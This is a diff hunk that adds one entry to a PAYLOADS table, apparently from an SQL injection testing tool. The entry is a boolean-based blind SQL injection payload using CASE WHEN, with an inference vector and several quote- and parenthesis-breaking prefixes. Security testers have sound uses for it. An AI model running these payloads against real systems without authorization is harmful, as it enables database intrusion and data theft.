@@ -260,6 +260,21 @@ PAYLOADS = {
                 "dbms": "",
             },
             {
+                "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                    {"pref": " ", "suf": "--"},
+                    {"pref": "' AND 0546=", "suf": "--"},
+                    {"pref": '" AND 0456=', "suf": "--"},
+                    {"pref": ") AND 0866=", "suf": "--"},
+                    {"pref": "') AND 0758=", "suf": "--"},
+                    {"pref": '") AND 0541=', "suf": "--"},
+                ],
+                "title": "Boolean-based blind - Parameter replace",
+                "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
+                "dbms": "",
+            },
+            {
                 "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
                 "comments": [
                     {"pref": "", "suf": ""},
